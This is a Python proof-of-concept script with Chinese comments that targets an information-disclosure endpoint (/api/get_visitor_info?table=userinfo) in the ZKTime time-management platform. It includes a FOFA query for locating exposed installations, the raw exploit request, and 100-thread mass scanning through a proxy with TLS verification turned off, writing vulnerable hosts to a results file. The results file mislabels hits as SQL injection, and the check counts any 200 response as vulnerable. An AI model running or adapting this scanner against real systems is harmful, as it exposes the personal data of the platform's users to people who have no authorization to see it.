# fofa：body="/media/img/login/zktime_logo_zh-cn.png" && body="/iclock/imanager"
"""GET /api/get_visitor_info?table=userinfo HTTP/1.1
    Host: 
    Upgrade-Insecure-Requests: 1
    Accept-Encoding: gzip, deflate
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"""

# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
  ______     __   ___   ________    _____     __    __      _____  
 (____  )   () ) / __) (___  ___)  (_   _)    \ \  / /     / ___/  
     / /    ( (_/ /        ) )       | |      () \/ ()    ( (__    
 ___/ /_    ()   (        ( (        | |      / _  _ \     ) __)   
/__  ___)   () /\ \        ) )       | |     / / \/ \ \   ( (      
  / /____   ( (  \ \      ( (       _| |__  /_/      \_\   \ \___  
 (_______)  ()_)  \_\     /__\     /_____( (/          \)   \____\ 
                                                                   
"""
    print(test)


def main():
    banner()

    # 初始化
    parse = argparse.ArgumentParser(description="ZKTime时间精细化管理平台 get_visitor_info 存在信息泄露")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 判断用户输入的参数
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(target):
    link = '/api/get_visitor_info?table=userinfo'
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
    proxies = {
        "http" : "http://127.0.0.1:7890",
        "https" : "http://127.0.0.1:7890"
    }

    try:
        res1 = requests.get(url=target,headers=headers,timeout=15,verify=False,proxies=proxies)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,headers=headers,timeout=15,verify=False,proxies=proxies)
            if res2.status_code == 200:
                print(f"[+]该{target}存在信息泄露")
                with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
                    f.write(f"[+]该{target}存在sql注入"+'\n')
            else:
                print(f"[-]该{target}不存在信息泄露")
    except:
        print(f"该{target}存在问题，请手工进行测试")

if __name__ == "__main__":
    main()